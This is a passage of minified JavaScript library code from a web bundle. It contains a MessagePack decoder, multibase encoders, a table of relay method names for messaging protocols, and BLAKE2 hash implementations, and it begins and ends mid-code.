s=pse(e,n,r),o=Uint8Array.prototype.slice.call(e,n,n+r);return this.store(o,s),s}}const r7="array",iE="map_key",bse="map_value",Y5e=t=>{if(typeof t=="string"||typeof t=="number")return t;throw new za("The type of key must be string or number but "+typeof t)};class Q5e{constructor(){this.stack=[],this.stackHeadPosition=-1}get length(){return this.stackHeadPosition+1}top(){return this.stack[this.stackHeadPosition]}pushArrayState(e){const n=this.getUninitializedStateFromPool();n.type=r7,n.position=0,n.size=e,n.array=new Array(e)}pushMapState(e){const n=this.getUninitializedStateFromPool();n.type=iE,n.readCount=0,n.size=e,n.map={}}getUninitializedStateFromPool(){if(this.stackHeadPosition++,this.stackHeadPosition===this.stack.length){const e={type:void 0,size:0,array:void 0,position:0,readCount:0,map:void 0,key:null};this.stack.push(e)}return this.stack[this.stackHeadPosition]}release(e){if(this.stack[this.stackHeadPosition]!==e)throw new Error("Invalid stack state. Released state is not on top of the stack.");if(e.type===r7){const r=e;r.size=0,r.array=void 0,r.position=0,r.type=void 0}if(e.type===iE||e.type===bse){const r=e;r.size=0,r.map=void 0,r.readCount=0,r.type=void 0}this.stackHeadPosition--}reset(){this.stack.length=0,this.stackHeadPosition=-1}}const Sv=-1,_B=new DataView(new ArrayBuffer(0)),J5e=new Uint8Array(_B.buffer);try{_B.getInt8(0)}catch(t){if(!(t instanceof RangeError))throw new Error("This module is not supported in the current JavaScript engine because DataView does not throw RangeError on out-of-bounds access")}const kz=new RangeError("Insufficient data"),X5e=new Z5e;let e3e=class wse{constructor(e){this.totalPos=0,this.pos=0,this.view=_B,this.bytes=J5e,this.headByte=Sv,this.stack=new Q5e,this.entered=!1,this.extensionCodec=e?.extensionCodec??Rx.defaultCodec,this.context=e?.context,this.useBigInt64=e?.useBigInt64??!1,this.rawStrings=e?.rawStrings??!1,this.maxStrLength=e?.maxStrLength??Cv,this.maxBinLength=e?.maxBinLength??Cv,this.maxArrayLength=e?.maxArrayLength??Cv,this.maxMapLength=e?.maxMapLength??Cv,this.maxExtLength=e?.maxExtLength??Cv,this.keyDecoder=e?.keyDecoder!==void 0?e.keyDecoder:X5e,this.mapKeyConverter=e?.mapKeyConverter??Y5e}clone(){return new wse({extensionCodec:this.extensionCodec,context:this.context,useBigInt64:this.useBigInt64,rawStrings:this.rawStrings,maxStrLength:this.maxStrLength,maxBinLength:this.maxBinLength,maxArrayLength:this.maxArrayLength,maxMapLength:this.maxMapLength,maxExtLength:this.maxExtLength,keyDecoder:this.keyDecoder})}reinitializeState(){this.totalPos=0,this.headByte=Sv,this.stack.reset()}setBuffer(e){const n=n7(e);this.bytes=n,this.view=new DataView(n.buffer,n.byteOffset,n.byteLength),this.pos=0}appendBuffer(e){if(this.headByte===Sv&&!this.hasRemaining(1))this.setBuffer(e);else{const n=this.bytes.subarray(this.pos),r=n7(e),i=new Uint8Array(n.length+r.length);i.set(n),i.set(r,n.length),this.setBuffer(i)}}hasRemaining(e){return this.view.byteLength-this.pos>=e}createExtraByteError(e){const{view:n,pos:r}=this;return new RangeError(`Extra ${n.byteLength-r} of ${n.byteLength} byte(s) found at buffer[${e}]`)}decode(e){if(this.entered)return this.clone().decode(e);try{this.entered=!0,this.reinitializeState(),this.setBuffer(e);const n=this.doDecodeSync();if(this.hasRemaining(1))throw this.createExtraByteError(this.pos);return n}finally{this.entered=!1}}*decodeMulti(e){if(this.entered){yield*this.clone().decodeMulti(e);return}try{for(this.entered=!0,this.reinitializeState(),this.setBuffer(e);this.hasRemaining(1);)yield this.doDecodeSync()}finally{this.entered=!1}}async decodeAsync(e){if(this.entered)return this.clone().decodeAsync(e);try{this.entered=!0;let n=!1,r;for await(const a of e){if(n)throw this.entered=!1,this.createExtraByteError(this.totalPos);this.appendBuffer(a);try{r=this.doDecodeSync(),n=!0}catch(c){if(!(c instanceof RangeError))throw c}this.totalPos+=this.pos}if(n){if(this.hasRemaining(1))throw this.createExtraByteError(this.totalPos);return r}const{headByte:i,pos:s,totalPos:o}=this;throw new RangeError(`Insufficient data in parsing ${u9(i)} at ${o} (${s} in the current buffer)`)}finally{this.entered=!1}}decodeArrayStream(e){return this.decodeMultiAsync(e,!0)}decodeStream(e){return this.decodeMultiAsync(e,!1)}async*decodeMultiAsync(e,n){if(this.entered){yield*this.clone().decodeMultiAsync(e,n);return}try{this.entered=!0;let r=n,i=-1;for await(const s of e){if(n&&i===0)throw this.createExtraByteError(this.totalPos);this.appendBuffer(s),r&&(i=this.readArraySize(),r=!1,this.complete());try{for(;yield this.doDecodeSync(),--i!==0;);}catch(o){if(!(o instanceof RangeError))throw o}this.totalPos+=this.pos}}finally{this.entered=!1}}doDecodeSync(){e:for(;;){const e=this.readHeadByte();let n;if(e>=224)n=e-256;else if(e<192)if(e<128)n=e;else if(e<144){const i=e-128;if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e<160){const i=e-144;if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else{const i=e-160;n=this.decodeString(i,0)}else if(e===192)n=null;else if(e===194)n=!1;else if(e===195)n=!0;else if(e===202)n=this.readF32();else if(e===203)n=this.readF64();else if(e===204)n=this.readU8();else if(e===205)n=this.readU16();else if(e===206)n=this.readU32();else if(e===207)this.useBigInt64?n=this.readU64AsBigInt():n=this.readU64();else if(e===208)n=this.readI8();else if(e===209)n=this.readI16();else if(e===210)n=this.readI32();else if(e===211)this.useBigInt64?n=this.readI64AsBigInt():n=this.readI64();else if(e===217){const i=this.lookU8();n=this.decodeString(i,1)}else if(e===218){const i=this.lookU16();n=this.decodeString(i,2)}else if(e===219){const i=this.lookU32();n=this.decodeString(i,4)}else if(e===220){const i=this.readU16();if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else if(e===221){const i=this.readU32();if(i!==0){this.pushArrayState(i),this.complete();continue e}else n=[]}else if(e===222){const i=this.readU16();if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e===223){const i=this.readU32();if(i!==0){this.pushMapState(i),this.complete();continue e}else n={}}else if(e===196){const i=this.lookU8();n=this.decodeBinary(i,1)}else if(e===197){const i=this.lookU16();n=this.decodeBinary(i,2)}else if(e===198){const i=this.lookU32();n=this.decodeBinary(i,4)}else if(e===212)n=this.decodeExtension(1,0);else if(e===213)n=this.decodeExtension(2,0);else if(e===214)n=this.decodeExtension(4,0);else if(e===215)n=this.decodeExtension(8,0);else if(e===216)n=this.decodeExtension(16,0);else if(e===199){const i=this.lookU8();n=this.decodeExtension(i,1)}else if(e===200){const i=this.lookU16();n=this.decodeExtension(i,2)}else if(e===201){const i=this.lookU32();n=this.decodeExtension(i,4)}else throw new za(`Unrecognized type byte: ${u9(e)}`);this.complete();const r=this.stack;for(;r.length>0;){const i=r.top();if(i.type===r7)if(i.array[i.position]=n,i.position++,i.position===i.size)n=i.array,r.release(i);else continue e;else if(i.type===iE){if(n==="__proto__")throw new za("The key __proto__ is not allowed");i.key=this.mapKeyConverter(n),i.type=bse;continue e}else if(i.map[i.key]=n,i.readCount++,i.readCount===i.size)n=i.map,r.release(i);else{i.key=null,i.type=iE;continue e}}return n}}readHeadByte(){return this.headByte===Sv&&(this.headByte=this.readU8()),this.headByte}complete(){this.headByte=Sv}readArraySize(){const e=this.readHeadByte();switch(e){case 220:return this.readU16();case 221:return this.readU32();default:{if(e<160)return e-144;throw new za(`Unrecognized array type byte: ${u9(e)}`)}}}pushMapState(e){if(e>this.maxMapLength)throw new za(`Max length exceeded: map length (${e}) > maxMapLengthLength (${this.maxMapLength})`);this.stack.pushMapState(e)}pushArrayState(e){if(e>this.maxArrayLength)throw new za(`Max length exceeded: array length (${e}) > maxArrayLength (${this.maxArrayLength})`);this.stack.pushArrayState(e)}decodeString(e,n){return!this.rawStrings||this.stateIsMapKey()?this.decodeUtf8String(e,n):this.decodeBinary(e,n)}decodeUtf8String(e,n){if(e>this.maxStrLength)throw new za(`Max length exceeded: UTF-8 byte length (${e}) > maxStrLength (${this.maxStrLength})`);if(this.bytes.byteLength<this.pos+n+e)throw kz;const r=this.pos+n;let i;return this.stateIsMapKey()&&this.keyDecoder?.canBeCached(e)?i=this.keyDecoder.decode(this.bytes,r,e):i=P5e(this.bytes,r,e),this.pos+=n+e,i}stateIsMapKey(){return this.stack.length>0?this.stack.top().type===iE:!1}decodeBinary(e,n){if(e>this.maxBinLength)throw new za(`Max length exceeded: bin length (${e}) > maxBinLength (${this.maxBinLength})`);if(!this.hasRemaining(e+n))throw kz;const r=this.pos+n,i=this.bytes.subarray(r,r+e);return this.pos+=n+e,i}decodeExtension(e,n){if(e>this.maxExtLength)throw new za(`Max length exceeded: ext length (${e}) > maxExtLength (${this.maxExtLength})`);const r=this.view.getInt8(this.pos+n),i=this.decodeBinary(e,n+1);return this.extensionCodec.decode(i,r,this.context)}lookU8(){return this.view.getUint8(this.pos)}lookU16(){return this.view.getUint16(this.pos)}lookU32(){return this.view.getUint32(this.pos)}readU8(){const e=this.view.getUint8(this.pos);return this.pos++,e}readI8(){const e=this.view.getInt8(this.pos);return this.pos++,e}readU16(){const e=this.view.getUint16(this.pos);return this.pos+=2,e}readI16(){const e=this.view.getInt16(this.pos);return this.pos+=2,e}readU32(){const e=this.view.getUint32(this.pos);return this.pos+=4,e}readI32(){const e=this.view.getInt32(this.pos);return this.pos+=4,e}readU64(){const e=O5e(this.view,this.pos);return this.pos+=8,e}readI64(){const e=gse(this.view,this.pos);return this.pos+=8,e}readU64AsBigInt(){const e=this.view.getBigUint64(this.pos);return this.pos+=8,e}readI64AsBigInt(){const e=this.view.getBigInt64(this.pos);return this.pos+=8,e}readF32(){const e=this.view.getFloat32(this.pos);return this.pos+=4,e}readF64(){const e=this.view.getFloat64(this.pos);return this.pos+=8,e}};function t3e(t,e){return new e3e(e).decode(t)}function AB(t){return globalThis.Buffer!=null?new Uint8Array(t.buffer,t.byteOffset,t.byteLength):t}function vse(t=0){return globalThis.Buffer!=null&&globalThis.Buffer.allocUnsafe!=null?AB(globalThis.Buffer.allocUnsafe(t)):new Uint8Array(t)}function sE(t,e){e||(e=t.reduce((i,s)=>i+s.length,0));const n=vse(e);let r=0;for(const i of t)n.set(i,r),r+=i.length;return AB(n)}function n3e(t,e){if(t.length>=255)throw new TypeError("Alphabet too long");for(var n=new Uint8Array(256),r=0;r<n.length;r++)n[r]=255;for(var i=0;i<t.length;i++){var s=t.charAt(i),o=s.charCodeAt(0);if(n[o]!==255)throw new TypeError(s+" is ambiguous");n[o]=i}var a=t.length,c=t.charAt(0),l=Math.log(a)/Math.log(256),f=Math.log(256)/Math.log(a);function h(w){if(w instanceof Uint8Array||(ArrayBuffer.isView(w)?w=new Uint8Array(w.buffer,w.byteOffset,w.byteLength):Array.isArray(w)&&(w=Uint8Array.from(w))),!(w instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(w.length===0)return"";for(var y=0,E=0,A=0,R=w.length;A!==R&&w[A]===0;)A++,y++;for(var S=(R-A)*f+1>>>0,v=new Uint8Array(S);A!==R;){for(var k=w[A],O=0,_=S-1;(k!==0||O<E)&&_!==-1;_--,O++)k+=256*v[_]>>>0,v[_]=k%a>>>0,k=k/a>>>0;if(k!==0)throw new Error("Non-zero carry");E=O,A++}for(var I=S-E;I!==S&&v[I]===0;)I++;for(var T=c.repeat(y);I<S;++I)T+=t.charAt(v[I]);return T}function m(w){if(typeof w!="string")throw new TypeError("Expected String");if(w.length===0)return new Uint8Array;var y=0;if(w[y]!==" "){for(var E=0,A=0;w[y]===c;)E++,y++;for(var R=(w.length-y)*l+1>>>0,S=new Uint8Array(R);w[y];){var v=n[w.charCodeAt(y)];if(v===255)return;for(var k=0,O=R-1;(v!==0||k<A)&&O!==-1;O--,k++)v+=a*S[O]>>>0,S[O]=v%256>>>0,v=v/256>>>0;if(v!==0)throw new Error("Non-zero carry");A=k,y++}if(w[y]!==" "){for(var _=R-A;_!==R&&S[_]===0;)_++;for(var I=new Uint8Array(E+(R-_)),T=E;_!==R;)I[T++]=S[_++];return I}}}function b(w){var y=m(w);if(y)return y;throw new Error(`Non-${e} character`)}return{encode:h,decodeUnsafe:m,decode:b}}var r3e=n3e,i3e=r3e;const s3e=t=>{if(t instanceof Uint8Array&&t.constructor.name==="Uint8Array")return t;if(t instanceof ArrayBuffer)return new Uint8Array(t);if(ArrayBuffer.isView(t))return new Uint8Array(t.buffer,t.byteOffset,t.byteLength);throw new Error("Unknown type, must be binary type")},o3e=t=>new TextEncoder().encode(t),a3e=t=>new TextDecoder().decode(t);class c3e{constructor(e,n,r){this.name=e,this.prefix=n,this.baseEncode=r}encode(e){if(e instanceof Uint8Array)return`${this.prefix}${this.baseEncode(e)}`;throw Error("Unknown type, must be binary type")}}class u3e{constructor(e,n,r){if(this.name=e,this.prefix=n,n.codePointAt(0)===void 0)throw new Error("Invalid prefix character");this.prefixCodePoint=n.codePointAt(0),this.baseDecode=r}decode(e){if(typeof e=="string"){if(e.codePointAt(0)!==this.prefixCodePoint)throw Error(`Unable to decode multibase string ${JSON.stringify(e)}, ${this.name} decoder only supports inputs prefixed with ${this.prefix}`);return this.baseDecode(e.slice(this.prefix.length))}else throw Error("Can only multibase decode strings")}or(e){return Ese(this,e)}}class l3e{constructor(e){this.decoders=e}or(e){return Ese(this,e)}decode(e){const n=e[0],r=this.decoders[n];if(r)return r.decode(e);throw RangeError(`Unable to decode multibase string ${JSON.stringify(e)}, only inputs prefixed with ${Object.keys(this.decoders)} are supported`)}}const Ese=(t,e)=>new l3e({...t.decoders||{[t.prefix]:t},...e.decoders||{[e.prefix]:e}});class d3e{constructor(e,n,r,i){this.name=e,this.prefix=n,this.baseEncode=r,this.baseDecode=i,this.encoder=new c3e(e,n,r),this.decoder=new u3e(e,n,i)}encode(e){return this.encoder.encode(e)}decode(e){return this.decoder.decode(e)}}const KI=({name:t,prefix:e,encode:n,decode:r})=>new d3e(t,e,n,r),J_=({prefix:t,name:e,alphabet:n})=>{const{encode:r,decode:i}=i3e(n,e);return KI({prefix:t,name:e,encode:r,decode:s=>s3e(i(s))})},f3e=(t,e,n,r)=>{const i={};for(let f=0;f<e.length;++f)i[e[f]]=f;let s=t.length;for(;t[s-1]==="=";)--s;const o=new Uint8Array(s*n/8|0);let a=0,c=0,l=0;for(let f=0;f<s;++f){const h=i[t[f]];if(h===void 0)throw new SyntaxError(`Non-${r} character`);c=c<<n|h,a+=n,a>=8&&(a-=8,o[l++]=255&c>>a)}if(a>=n||255&c<<8-a)throw new SyntaxError("Unexpected end of data");return o},h3e=(t,e,n)=>{const r=e[e.length-1]==="=",i=(1<<n)-1;let s="",o=0,a=0;for(let c=0;c<t.length;++c)for(a=a<<8|t[c],o+=8;o>n;)o-=n,s+=e[i&a>>o];if(o&&(s+=e[i&a<<n-o]),r)for(;s.length*n&7;)s+="=";return s},Rs=({name:t,prefix:e,bitsPerChar:n,alphabet:r})=>KI({prefix:e,name:t,encode(i){return h3e(i,r,n)},decode(i){return f3e(i,r,n,t)}}),p3e=KI({prefix:"\0",name:"identity",encode:t=>a3e(t),decode:t=>o3e(t)}),m3e=Object.freeze(Object.defineProperty({__proto__:null,identity:p3e},Symbol.toStringTag,{value:"Module"})),g3e=Rs({prefix:"0",name:"base2",alphabet:"01",bitsPerChar:1}),y3e=Object.freeze(Object.defineProperty({__proto__:null,base2:g3e},Symbol.toStringTag,{value:"Module"})),b3e=Rs({prefix:"7",name:"base8",alphabet:"01234567",bitsPerChar:3}),w3e=Object.freeze(Object.defineProperty({__proto__:null,base8:b3e},Symbol.toStringTag,{value:"Module"})),v3e=J_({prefix:"9",name:"base10",alphabet:"0123456789"}),E3e=Object.freeze(Object.defineProperty({__proto__:null,base10:v3e},Symbol.toStringTag,{value:"Module"})),_3e=Rs({prefix:"f",name:"base16",alphabet:"0123456789abcdef",bitsPerChar:4}),A3e=Rs({prefix:"F",name:"base16upper",alphabet:"0123456789ABCDEF",bitsPerChar:4}),C3e=Object.freeze(Object.defineProperty({__proto__:null,base16:_3e,base16upper:A3e},Symbol.toStringTag,{value:"Module"})),S3e=Rs({prefix:"b",name:"base32",alphabet:"abcdefghijklmnopqrstuvwxyz234567",bitsPerChar:5}),T3e=Rs({prefix:"B",name:"base32upper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567",bitsPerChar:5}),x3e=Rs({prefix:"c",name:"base32pad",alphabet:"abcdefghijklmnopqrstuvwxyz234567=",bitsPerChar:5}),I3e=Rs({prefix:"C",name:"base32padupper",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567=",bitsPerChar:5}),R3e=Rs({prefix:"v",name:"base32hex",alphabet:"0123456789abcdefghijklmnopqrstuv",bitsPerChar:5}),P3e=Rs({prefix:"V",name:"base32hexupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV",bitsPerChar:5}),N3e=Rs({prefix:"t",name:"base32hexpad",alphabet:"0123456789abcdefghijklmnopqrstuv=",bitsPerChar:5}),O3e=Rs({prefix:"T",name:"base32hexpadupper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUV=",bitsPerChar:5}),k3e=Rs({prefix:"h",name:"base32z",alphabet:"ybndrfg8ejkmcpqxot1uwisza345h769",bitsPerChar:5}),D3e=Object.freeze(Object.defineProperty({__proto__:null,base32:S3e,base32hex:R3e,base32hexpad:N3e,base32hexpadupper:O3e,base32hexupper:P3e,base32pad:x3e,base32padupper:I3e,base32upper:T3e,base32z:k3e},Symbol.toStringTag,{value:"Module"})),B3e=J_({prefix:"k",name:"base36",alphabet:"0123456789abcdefghijklmnopqrstuvwxyz"}),j3e=J_({prefix:"K",name:"base36upper",alphabet:"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"}),M3e=Object.freeze(Object.defineProperty({__proto__:null,base36:B3e,base36upper:j3e},Symbol.toStringTag,{value:"Module"})),U3e=J_({name:"base58btc",prefix:"z",alphabet:"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"}),L3e=J_({name:"base58flickr",prefix:"Z",alphabet:"123456789abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ"}),F3e=Object.freeze(Object.defineProperty({__proto__:null,base58btc:U3e,base58flickr:L3e},Symbol.toStringTag,{value:"Module"})),$3e=Rs({prefix:"m",name:"base64",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",bitsPerChar:6}),H3e=Rs({prefix:"M",name:"base64pad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",bitsPerChar:6}),z3e=Rs({prefix:"u",name:"base64url",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_",bitsPerChar:6}),q3e=Rs({prefix:"U",name:"base64urlpad",alphabet:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_=",bitsPerChar:6}),V3e=Object.freeze(Object.defineProperty({__proto__:null,base64:$3e,base64pad:H3e,base64url:z3e,base64urlpad:q3e},Symbol.toStringTag,{value:"Module"})),_se=Array.from(""),W3e=_se.reduce((t,e,n)=>(t[n]=e,t),[]),G3e=_se.reduce((t,e,n)=>(t[e.codePointAt(0)]=n,t),[]);function K3e(t){return t.reduce((e,n)=>(e+=W3e[n],e),"")}function Z3e(t){const e=[];for(const n of t){const r=G3e[n.codePointAt(0)];if(r===void 0)throw new Error(`Non-base256emoji character: ${n}`);e.push(r)}return new Uint8Array(e)}const Y3e=KI({prefix:"",name:"base256emoji",encode:K3e,decode:Z3e}),Q3e=Object.freeze(Object.defineProperty({__proto__:null,base256emoji:Y3e},Symbol.toStringTag,{value:"Module"}));new TextEncoder;new TextDecoder;const Dz={...m3e,...y3e,...w3e,...E3e,...C3e,...D3e,...M3e,...F3e,...V3e,...Q3e};function Ase(t,e,n,r){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:n},decoder:{decode:r}}}const Bz=Ase("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),l9=Ase("ascii","a",t=>{let e="a";for(let n=0;n<t.length;n++)e+=String.fromCharCode(t[n]);return e},t=>{t=t.substring(1);const e=vse(t.length);for(let n=0;n<t.length;n++)e[n]=t.charCodeAt(n);return e}),Cse={utf8:Bz,"utf-8":Bz,hex:Dz.base16,latin1:l9,ascii:l9,binary:l9,...Dz};function Mc(t,e="utf8"){const n=Cse[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?AB(globalThis.Buffer.from(t,"utf-8")):n.decoder.decode(`${n.prefix}${t}`)}function ta(t,e="utf8"){const n=Cse[e];if(!n)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):n.encoder.encode(t).substring(1)}const J3e={waku:{publish:"waku_publish",batchPublish:"waku_batchPublish",subscribe:"waku_subscribe",batchSubscribe:"waku_batchSubscribe",subscription:"waku_subscription",unsubscribe:"waku_unsubscribe",batchUnsubscribe:"waku_batchUnsubscribe",batchFetchMessages:"waku_batchFetchMessages"},irn:{publish:"irn_publish",batchPublish:"irn_batchPublish",subscribe:"irn_subscribe",batchSubscribe:"irn_batchSubscribe",subscription:"irn_subscription",unsubscribe:"irn_unsubscribe",batchUnsubscribe:"irn_batchUnsubscribe",batchFetchMessages:"irn_batchFetchMessages"},iridium:{publish:"iridium_publish",batchPublish:"iridium_batchPublish",subscribe:"iridium_subscribe",batchSubscribe:"iridium_batchSubscribe",subscription:"iridium_subscription",unsubscribe:"iridium_unsubscribe",batchUnsubscribe:"iridium_batchUnsubscribe",batchFetchMessages:"iridium_batchFetchMessages"}};var d9,jz;function Sse(){if(jz)return d9;jz=1;const t="Input must be an string, Buffer or Uint8Array";function e(o){let a;if(o instanceof Uint8Array)a=o;else if(typeof o=="string")a=new TextEncoder().encode(o);else throw new Error(t);return a}function n(o){return Array.prototype.map.call(o,function(a){return(a<16?"0":"")+a.toString(16)}).join("")}function r(o){return(4294967296+o).toString(16).substring(1)}function i(o,a,c){let l=`
`+o+" = ";for(let f=0;f<a.length;f+=2){if(c===32)l+=r(a[f]).toUpperCase(),l+=" ",l+=r(a[f+1]).toUpperCase();else if(c===64)l+=r(a[f+1]).toUpperCase(),l+=r(a[f]).toUpperCase();else throw new Error("Invalid size "+c);f%6===4?l+=`
`+new Array(o.length+4).join(" "):f<a.length-2&&(l+=" ")}console.log(l)}function s(o,a,c){let l=new Date().getTime();const f=new Uint8Array(a);for(let m=0;m<a;m++)f[m]=m%256;const h=new Date().getTime();console.log("Generated random input in "+(h-l)+"ms"),l=h;for(let m=0;m<c;m++){const b=o(f),w=new Date().getTime(),y=w-l;l=w,console.log("Hashed in "+y+"ms: "+b.substring(0,20)+"..."),console.log(Math.round(a/(1<<20)/(y/1e3)*100)/100+" MB PER SECOND")}}return d9={normalizeInput:e,toHex:n,debugPrint:i,testSpeed:s},d9}var f9,Mz;function X3e(){if(Mz)return f9;Mz=1;const t=Sse();function e(A,R,S){const v=A[R]+A[S];let k=A[R+1]+A[S+1];v>=4294967296&&k++,A[R]=v,A[R+1]=k}function n(A,R,S,v){let k=A[R]+S;S<0&&(k+=4294967296);let O=A[R+1]+v;k>=4294967296&&O++,A[R]=k,A[R+1]=O}function r(A,R){return A[R]^A[R+1]<<8^A[R+2]<<16^A[R+3]<<24}function i(A,R,S,v,k,O){const _=l[k],I=l[k+1],T=l[O],B=l[O+1];e(c,A,R),n(c,A,_,I);let U=c[v]^c[A],M=c[v+1]^c[A+1];c[v]=M,c[v+1]=U,e(c,S,v),U=c[R]^c[S],M=c[R+1]^c[S+1],c[R]=U>>>24^M<<8,c[R+1]=M>>>24^U<<8,e(c,A,R),n(c,A,T,B),U=c[v]^c[A],M=c[v+1]^c[A+1],c[v]=U>>>16^M<<16,c[v+1]=M>>>16^U<<16,e(c,S,v),U=c[R]^c[S],M=c[R+1]^c[S+1],c[R]=M>>>31^U<<1,c[R+1]=U>>>31^M<<1}const s=new Uint32Array([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),o=[0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3],a=new Uint8Array(o.map(function(A){return A*2})),c=new Uint32Array(32),l=new Uint32Array(32);function f(A,R){let S=0;for(S=0;S<16;S++)c[S]=A.h[S],c[S+16]=s[S];for(c[24]=c[24]^A.t,c[25]=c[25]^A.t/4294967296,R&&(c[28]=~c[28],c[29]=~c[29]),S=0;S<32;S++)l[S]=r(A.b,4*S);for(S=0;S<12;S++)i(0,8,16,24,a[S*16+0],a[S*16+1]),i(2,10,18,26,a[S*16+2],a[S*16+3]),i(4,12,20,28,a[S*16+4],a[S*16+5]),i(6,14,22,30,a[S*16+6],a[S*16+7]),i(0,10,20,30,a[S*16+8],a[S*16+9]),i(2,12,22,24,a[S*16+10],a[S*16+11]),i(4,14,16,26,a[S*16+12],a[S*16+13]),i(6,8,18,28,a[S*16+14],a[S*16+15]);for(S=0;S<16;S++)A.h[S]=A.h[S]^c[S]^c[S+16]}const h=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]);function m(A,R,S,v){if(A===0||A>64)throw new Error("Illegal output length, expected 0 < length <= 64");if(R&&R.length>64)throw new Error("Illegal key, expected Uint8Array with 0 < length <= 64");if(S&&S.length!==16)throw new Error("Illegal salt, expected Uint8Array with length is 16");if(v&&v.length!==16)throw new Error("Illegal personal, expected Uint8Array with length is 16");const k={b:new Uint8Array(128),h:new Uint32Array(16),t:0,c:0,outlen:A};h.fill(0),h[0]=A,R&&(h[1]=R.length),h[2]=1,h[3]=1,S&&h.set(S,32),v&&h.set(v,48);for(let O=0;O<16;O++)k.h[O]=s[O]^r(h,O*4);return R&&(b(k,R),k.c=128),k}function b(A,R){for(let S=0;S<R.length;S++)A.c===128&&(A.t+=A.c,f(A,!1),A.c=0),A.b[A.c++]=R[S]}function w(A){for(A.t+=A.c;A.c<128;)A.b[A.c++]=0;f(A,!0);const R=new Uint8Array(A.outlen);for(let S=0;S<A.outlen;S++)R[S]=A.h[S>>2]>>8*(S&3);return R}function y(A,R,S,v,k){S=S||64,A=t.normalizeInput(A),v&&(v=t.normalizeInput(v)),k&&(k=t.normalizeInput(k));const O=m(S,R,v,k);return b(O,A),w(O)}function E(A,R,S,v,k){const O=y(A,R,S,v,k);return t.toHex(O)}return f9={blake2b:y,blake2bHex:E,blake2bInit:m,blake2bUpdate:b,blake2bFinal:w},f9}var h9,Uz;function e6e(){if(Uz)return h9;Uz=1;const t=Sse();function e(w,y){return w[y]^w[y+1]<<8^w[y+2]<<16^w[y+3]<<24}function n(w,y,E,A,R,S){o[w]=o[w]+o[y]+R,o[A]=r(o[A]^o[w],16),o[E]=o[E]+o[A],o[y]=r(o[y]^o[E],12),o[w]=o[w]+o[y]+S,o[A]=r(o[A]^o[w],8),o[E]=o[E]+o[A],o[y]=r(o[y]^o[E],7)}function r(w,y){return w>>>y^w<<32-y}const i=new Uint32Array([1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225]),s=new Uint8Array([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0]),o=new Uint32Array(16),a=new Uint32Array(16);function c(w,y){let 